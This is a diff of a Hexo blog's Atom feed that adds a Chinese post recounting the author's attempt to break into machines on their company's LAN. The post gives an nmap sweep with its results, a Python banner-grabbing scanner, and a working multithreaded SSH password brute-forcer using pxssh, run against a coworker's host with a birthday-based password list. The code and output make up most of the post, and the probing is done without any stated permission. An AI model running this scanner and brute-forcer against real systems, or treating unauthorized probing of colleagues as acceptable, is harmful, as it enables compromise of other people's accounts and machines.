@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://microndgt.github.io/"/>
-  <updated>2017-02-20T02:35:05.000Z</updated>
+  <updated>2017-02-20T09:26:41.000Z</updated>
   <id>http://microndgt.github.io/</id>
   
   <author>
@@ -14,6 +14,59 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>局域网入侵记1</title>
+    <link href="http://microndgt.github.io/2017/02/20/%E5%B1%80%E5%9F%9F%E7%BD%91%E5%85%A5%E4%BE%B5%E8%AE%B01/"/>
+    <id>http://microndgt.github.io/2017/02/20/局域网入侵记1/</id>
+    <published>2017-02-20T08:52:29.000Z</published>
+    <updated>2017-02-20T09:26:41.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>我们的目标是－－－成为一名黑客～ 虽然现在啥都不会，可是有一颗黑客的心（秘制尴尬），哈哈哈</p>
+<p>最近深入研究了计算机网络，并且一直在开发web服务器，所以突发奇想看看自己所在局域网有没有可以入侵的主机;-)，公司的小伙伴可不要打我哟，我只是看看，不搞事情。。。</p>
+<p>第一步查看下局域网中有哪些打开的端口，祭上大杀器NMAP扫描器！</p>
+<h1 id="NMAP扫描"><a href="#NMAP扫描" class="headerlink" title="NMAP扫描"></a>NMAP扫描</h1><p>使用客户端也行，命令行也行，命令：<code>nmap -p 1-65535 -T4 -A -v 192.168.0.*</code>，这里只检测TCP连接。检测很快就有结果了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Initiating SYN Stealth Scan at 16:28</div><div class="line">Scanning 8 hosts [65535 ports/host]</div><div class="line">Discovered open port 445/tcp on 192.168.0.104</div><div class="line">Discovered open port 8888/tcp on 192.168.0.101</div><div class="line">Discovered open port 8080/tcp on 192.168.0.112</div><div class="line">Discovered open port 3306/tcp on 192.168.0.117</div><div class="line">Discovered open port 22/tcp on 192.168.0.117</div><div class="line">Discovered open port 80/tcp on 192.168.0.1</div><div class="line">Discovered open port 135/tcp on 192.168.0.104</div><div class="line">Discovered open port 139/tcp on 192.168.0.104</div><div class="line">SYN Stealth Scan Timing: About 0.57% done</div></pre></td></tr></table></figure>
+<p>这里的端口逐一介绍下：</p>
+<ul>
+<li>445端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，估计是公司的可联网打印机，常用入侵端口</li>
+<li>8888端口，这个是和我合作的前端妹纸的电脑开的，是测试前端程序呢，不打搅啦</li>
+<li>8080端口，这个我发送了个GET请求 <code>/index</code>，返回了官网数据，看来是一个web服务器</li>
+<li>3306端口，这个是MySQL的默认端口，常用入侵端口</li>
+<li>22端口，ssh端口,可以用于登录</li>
+<li>80端口，是为HTTP开放的,连路由器用的</li>
+<li>135端口，Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。常用入侵端口</li>
+<li>139端口，NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。常用入侵端口</li>
+</ul>
+<p>这个<code>192.168.0.104</code>开了这么多易入侵端口，就不怕吗？我发现断了打印机的电，仍然有这个IP的存在，看来不是打印机，那会是哪台主机这么随便？</p>
+<h1 id="获取banner"><a href="#获取banner" class="headerlink" title="获取banner"></a>获取banner</h1><p>这里写了一个漏洞扫描器，也就是向每个IP，每个可能的端口发送连接请求，查看返回的banner</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line">def retBanner(ip, port):</div><div class="line">    try:</div><div class="line">        socket.setdefaulttimeout(2)</div><div class="line">        s = socket.socket()</div><div class="line">        s.connect((ip, port))</div><div class="line">        # 连接后的返回值</div><div class="line">        banner = s.recv(1024)</div><div class="line">        return banner</div><div class="line">    except:</div><div class="line">        return</div><div class="line">def checkVulns(banners, filename):</div><div class="line">    &apos;&apos;&apos;检查是否是漏洞，检查列表从文件读取&apos;&apos;&apos;</div><div class="line">    f = open(filename, &apos;r&apos;)</div><div class="line">    for line in f.readlines():</div><div class="line">        if line.strip(&apos;\n&apos;) in banners:</div><div class="line">            print(&apos;server is vulnerable:&apos; + banners.strip(&apos;\n&apos;))</div><div class="line">def main():</div><div class="line">    &apos;&apos;&apos;执行的主函数&apos;&apos;&apos;</div><div class="line">    portList = [21, 22, 25, 80, 110, 443]</div><div class="line">    for x in range(100, 150):</div><div class="line">        ip = &apos;192.168.0.&apos; + str(x)</div><div class="line">        for port in portList:</div><div class="line">            print(&quot;ip:&quot;, ip, &quot; port:&quot;, port)</div><div class="line">            banner = retBanner(ip, port)</div><div class="line">            # 如果存在返回值</div><div class="line">            if banner:</div><div class="line">                print(ip + &quot;: &quot; + banner.decode(&apos;utf-8&apos;))</div><div class="line">                # checkVulns(banner, filename)</div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>最后结果发现有这么几台主机开了ssh服务，可以进行远程登录，但是都需要密码，所以只好暴力猜解咯。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">ip: 192.168.0.117  port: 22</div><div class="line">192.168.0.117: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.117  port: 25</div><div class="line">ip: 192.168.0.117  port: 80</div><div class="line">ip: 192.168.0.117  port: 110</div><div class="line">ip: 192.168.0.117  port: 443</div><div class="line">ip: 192.168.0.118  port: 21</div><div class="line">ip: 192.168.0.118  port: 22</div><div class="line">192.168.0.118: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.118  port: 25</div><div class="line">ip: 192.168.0.118  port: 80</div><div class="line">ip: 192.168.0.118  port: 110</div><div class="line">ip: 192.168.0.118  port: 443</div><div class="line">ip: 192.168.0.119  port: 21</div><div class="line">ip: 192.168.0.119  port: 22</div><div class="line">192.168.0.119: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.119  port: 25</div></pre></td></tr></table></figure>
+<h1 id="ssh登录暴力猜解"><a href="#ssh登录暴力猜解" class="headerlink" title="ssh登录暴力猜解"></a>ssh登录暴力猜解</h1><h2 id="破解字典"><a href="#破解字典" class="headerlink" title="破解字典"></a>破解字典</h2><p>一个黑客能不能破解密码，主要看他的字典大不大= =</p>
+<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><p>这里是一个暴力猜解程序，使用了多线程，密码就用<code>19800101</code>以来的生日值做测试，所以大家以后不要用生日来做密码啦，很容易被破解的。</p>
+<p>使用了<code>pexpect</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line"># 安装pxssh包</div><div class="line"># wget http://pexpect.sourceforge.net/pexpect-2.3.tar.gz</div><div class="line"># tar -xzf pexpect-2.3.tar.gz</div><div class="line"># cd pexpect-2.3</div><div class="line"># sudo python setup.py install</div><div class="line">import pexpect.pxssh as pxssh</div><div class="line">import optparse</div><div class="line">import time</div><div class="line">from threading import *</div><div class="line">maxConnections = 5</div><div class="line"># 相当于可用资源数acquire -1 release +1 然后release会检查上限</div><div class="line">connection_lock = BoundedSemaphore(value=maxConnections)</div><div class="line">Found = False</div><div class="line">Fails = 0</div><div class="line"># pxssh可以用预先写好的login(),logout()和prompt()等函数直接与ssh交互</div><div class="line">def connect(host, user, password, release):</div><div class="line">    global Found</div><div class="line">    global Fails</div><div class="line">    try:</div><div class="line">        s = pxssh.pxssh()</div><div class="line">        s.login(host, user, password)</div><div class="line">        # 如果登陆成功说明找到密码</div><div class="line">        print(&apos;[+] Password Found:&apos; + password)</div><div class="line">        Found = True</div><div class="line">    except Exception as e:</div><div class="line">        # 说明ssh服务器被大量连接刷爆了</div><div class="line">        if &apos;read_nonblocking&apos; in str(e):</div><div class="line">            Fails += 1</div><div class="line">            time.sleep(5)</div><div class="line">            connect(host, user, password, False)</div><div class="line">            # 提示符提取困难</div><div class="line">        elif &apos;synchronize with original prompt&apos; in str(e):</div><div class="line">            time.sleep(1)</div><div class="line">            connect(host, user, password, False)</div><div class="line">    finally:</div><div class="line">        if release:</div><div class="line">            connection_lock.release()</div><div class="line">def main():</div><div class="line">    global Found</div><div class="line">    global Fails</div><div class="line">    # 一个命令行解析</div><div class="line">    parser = optparse.OptionParser(&apos;usage%prog -H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&apos;)</div><div class="line">    parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;)</div><div class="line">    parser.add_option(&apos;-F&apos;, dest=&apos;passwordFile&apos;, type=&apos;string&apos;, help=&apos;specify password file&apos;)</div><div class="line">    parser.add_option(&apos;-u&apos;, dest=&apos;user&apos;, type=&apos;string&apos;, help=&apos;specify the user&apos;)</div><div class="line">    # 定义完所有参数之后开始解析传入的参数</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">    # options包含所有参数</div><div class="line">    host = options.tgtHost</div><div class="line">    passwordFile = options.passwordFile</div><div class="line">    user = options.user</div><div class="line">    if host == None or passwordFile == None or user == None:</div><div class="line">        print(parser.usage)</div><div class="line">        exit(0)</div><div class="line">    fn = open(passwordFile, &apos;r&apos;)</div><div class="line">    for line in fn.readlines():</div><div class="line">        if Found:</div><div class="line">            print(&quot;Password Found&quot;)</div><div class="line">            exit(0)</div><div class="line">        if Fails &gt; 5:</div><div class="line">            print(&quot;too many socket timeouts&quot;)</div><div class="line">            exit(0)</div><div class="line">        connection_lock.acquire()</div><div class="line">        password = line.strip(&apos;\r&apos;).strip(&apos;\n&apos;)</div><div class="line">        print(&quot;Testing:&quot; + str(password))</div><div class="line">        t = Thread(target=connect, args=(host, user, password, True))</div><div class="line">        t.start()</div><div class="line">        # time.sleep(0.1)</div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>破解中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Testing:19940629</div><div class="line">Testing:19940630</div><div class="line">Testing:19940701</div><div class="line">Testing:19940702</div><div class="line">Testing:19940703</div></pre></td></tr></table></figure>
+<p>然并卵，破解失败。。。看来这个主机的主人机智的没有使用生日做密码。。。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;我们的目标是－－－成为一名黑客～ 虽然现在啥都不会，可是有一颗黑客的心（秘制尴尬），哈哈哈&lt;/p&gt;
+&lt;p&gt;最近深入研究了计算机网络，并且一直在开发web服务器，所以突发奇想看看自己所在局域网有没有可以入侵的主机;-)，公司的小伙伴可不要打我哟，我只是看看，不搞事情。。。&lt;/
+    
+    </summary>
+    
+      <category term="黑客" scheme="http://microndgt.github.io/categories/%E9%BB%91%E5%AE%A2/"/>
+    
+    
+      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="黑客" scheme="http://microndgt.github.io/tags/%E9%BB%91%E5%AE%A2/"/>
+    
+  </entry>
   
   <entry>
     <title>BAIDU的DNS解析</title>
@@ -65,7 +118,7 @@
     <link href="http://microndgt.github.io/2017/02/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/"/>
     <id>http://microndgt.github.io/2017/02/19/计算机网络-应用层/</id>
     <published>2017-02-19T03:06:16.000Z</published>
-    <updated>2017-02-19T09:29:02.000Z</updated>
+    <updated>2017-02-20T08:52:36.000Z</updated>
     
     <content type="html"><![CDATA[<p>网络应用方面的原理和实现，包括应用程序所需要使用的网络服务，客户和服务器，进程和运输层接口。研发网络应用程序的核心是写出能够运行在不同的端系统和通过网络彼此通信的程序。</p>
 <h1 id="应用层协议原理"><a href="#应用层协议原理" class="headerlink" title="应用层协议原理"></a>应用层协议原理</h1><h2 id="网络应用程序体系结构"><a href="#网络应用程序体系结构" class="headerlink" title="网络应用程序体系结构"></a>网络应用程序体系结构</h2><p>网络体系结构是固定的，为应用程序提供了特定的服务集合，应用程序体系结构主要有一下：客户－服务器体系结构或者对等P2P体系结构</p>
@@ -1015,69 +1068,6 @@
       <category term="Udacity" scheme="http://microndgt.github.io/tags/Udacity/"/>
     
       <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hive学习</title>
-    <link href="http://microndgt.github.io/2017/01/19/Hive%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://microndgt.github.io/2017/01/19/Hive学习/</id>
-    <published>2017-01-19T07:26:16.000Z</published>
-    <updated>2017-01-27T05:24:21.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>大数据之Hive的数据操作以及开发</p>
-<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Hive是基于Hadoop的一个数据仓库工具，通过它可以实现将结构化的数据文件映射为一张数据库表，并且提供简单的sql查询功能，同时将sql语句转换为MapReduce任务进行运行</p>
-<p>Hive是构建在hadoop HDFS上的一个数据仓库</p>
-<h2 id="数据仓库简介"><a href="#数据仓库简介" class="headerlink" title="数据仓库简介"></a>数据仓库简介</h2><p>有别于普通的数据库，数据仓库是一个面向主题的，集成的，不可更新的，随时间不变化的数据集合，它用于支持企业或组织的决策分析处理</p>
-<p>面向主题：用户关注的具体方面</p>
-<p>集成的：来自分散性的数据，进行加工和处理后进入数据仓库</p>
-<p>不可更新：主要用于决策分析，主要涉及操作，数据查询</p>
-<h2 id="数据仓库的结构和建立过程"><a href="#数据仓库的结构和建立过程" class="headerlink" title="数据仓库的结构和建立过程"></a>数据仓库的结构和建立过程</h2><p>数据源：业务数据系统，文档资料，其他数据</p>
-<p>数据存储及管理：抽取，转换，装载，Extract,Transform,load，满足格式的数据</p>
-<p>数据仓库引擎：为数据查询等提供服务</p>
-<p>前端展示：数据查询，数据报表，数据分析，各类应用</p>
-<h2 id="OLTP应用和OLAP应用"><a href="#OLTP应用和OLAP应用" class="headerlink" title="OLTP应用和OLAP应用"></a>OLTP应用和OLAP应用</h2><p>OLTP:连接事务处理，面对事务，操作频率高，银行转账</p>
-<p>OLAP:连接分析处理，Online analysis process, 商品推荐系统,面对的是查询操作</p>
-<h2 id="数据仓库中的数据模型"><a href="#数据仓库中的数据模型" class="headerlink" title="数据仓库中的数据模型"></a>数据仓库中的数据模型</h2><p>面向主题的模型</p>
-<p>星形模型：商品信息-&gt;客户信息，订单信息，促销信息，生产信息，物流信息</p>
-<p>雪花模型：客户也可以分很多信息，家庭信息，地址信息，教育背景信息，财务信息</p>
-<h2 id="Hive"><a href="#Hive" class="headerlink" title="Hive"></a>Hive</h2><p>Hive是构建在hadoop HDFS上的一个数据仓库基础架构</p>
-<p>可以用来进行数据提取转化加载ETL</p>
-<p>定义了简单的类似SQL查询语言，称为HQL它允许熟悉SQL的用户查询数据</p>
-<p>允许MapReduce开发者的开发自定义的mapper和reducer来处理内建的mapper和reducer无法完成的复杂分析工作</p>
-<p>Hive是SQL解析引擎，将SQL语句转移成M/R job然后在hadoop执行</p>
-<p>Hive的表其实是HDFS的目录/文件</p>
-<h1 id="Hive的体系结构"><a href="#Hive的体系结构" class="headerlink" title="Hive的体系结构"></a>Hive的体系结构</h1><h2 id="Hive的元数据"><a href="#Hive的元数据" class="headerlink" title="Hive的元数据"></a>Hive的元数据</h2><p>将元数据存储在数据库中(metastore)，支持mysql，derby等数据库，默认是derby数据库。</p>
-<p>元数据包括表的名字，表的列和分区及其属性，表的属性是否为外部表，表的数据所在目录</p>
-<h2 id="HQL的执行过程"><a href="#HQL的执行过程" class="headerlink" title="HQL的执行过程"></a>HQL的执行过程</h2><p>解释器，编译器和优化器完成HQL查询语句从词法分析，语法分析，编译，优化以及查询计划的生成，生成的查询计划存储在HDFS中，并在随后由MapReduce调用执行</p>
-<p>select-&gt;解析器，词法分析-&gt;编译器，生成HQL的执行计划-&gt;优化器，生成最佳的执行计划-&gt;执行</p>
-<h2 id="Hive的体系结构-1"><a href="#Hive的体系结构-1" class="headerlink" title="Hive的体系结构"></a>Hive的体系结构</h2><ul>
-<li>Hadoop</li>
-<li>元数据存储</li>
-</ul>
-<p>linux-&gt;hadoop-&gt;hive</p>
-<p>hadoop: DataNode数据节点，NameNode名称节点，JobTracker任务调度器</p>
-<p>hive：Hive Driver驱动包括编译器，解析器，优化器。访问接口：CLI,ODBC,Web Console只可以查询。元数据metastore</p>
-<h2 id="Hive安装和管理"><a href="#Hive安装和管理" class="headerlink" title="Hive安装和管理"></a>Hive安装和管理</h2><h2 id="Hive的数据模型和操作"><a href="#Hive的数据模型和操作" class="headerlink" title="Hive的数据模型和操作"></a>Hive的数据模型和操作</h2><h1 id="Hive的数据导入到数据仓库"><a href="#Hive的数据导入到数据仓库" class="headerlink" title="Hive的数据导入到数据仓库"></a>Hive的数据导入到数据仓库</h1><h2 id="load语句执行数据导入"><a href="#load语句执行数据导入" class="headerlink" title="load语句执行数据导入"></a>load语句执行数据导入</h2><p><code>LOAD DATA [LOCAL] INPATH &#39;filepath&#39; [OVERWRITE] INTO TABLE tablename [PARTITION (partcol1=vall, partcol2=val2)]</code></p>
-<p>PARTITION当是分区表</p>
-<p>load命令，Sqoop组件导入</p>
-<p>数据查询 HQL语句</p>
-<p>Hive的Java客户端和自定义函数</p>
-<p>Hive的体系结构和基本操作</p>
-<p>Java编程</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;大数据之Hive的数据操作以及开发&lt;/p&gt;
-&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Hive是基于Hadoop的一个数据仓库工具，通过它可以实现将结构化的数据文件映射为一张数
-    
-    </summary>
-    
-      <category term="数据分析" scheme="http://microndgt.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
-    
-    
-      <category term="Hive" scheme="http://microndgt.github.io/tags/Hive/"/>
     
   </entry>
   
